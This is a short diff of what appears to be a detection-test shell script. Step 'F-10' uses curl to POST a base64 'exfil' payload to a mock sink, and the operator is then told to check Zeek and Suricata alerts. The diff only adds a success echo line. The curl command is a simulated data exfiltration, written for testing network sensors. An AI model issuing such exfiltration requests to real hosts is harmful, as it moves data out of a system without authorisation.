@@ -12,4 +12,5 @@ step "POST base64-ish body to mock sink (${SINK})"
 require_tool curl
 run_cmd "curl -sS -X POST -H 'Content-Type: application/json' -d '{\"exfil\":\"dGVzdC1jYWRyZS1mMTA=\"}' --connect-timeout 5 '${SINK}' || true"
 ok "F-10 probe sent — check Zeek http.log / Suricata npm-010"
+echo "F10_OK"
 result 0 "F-10 complete"
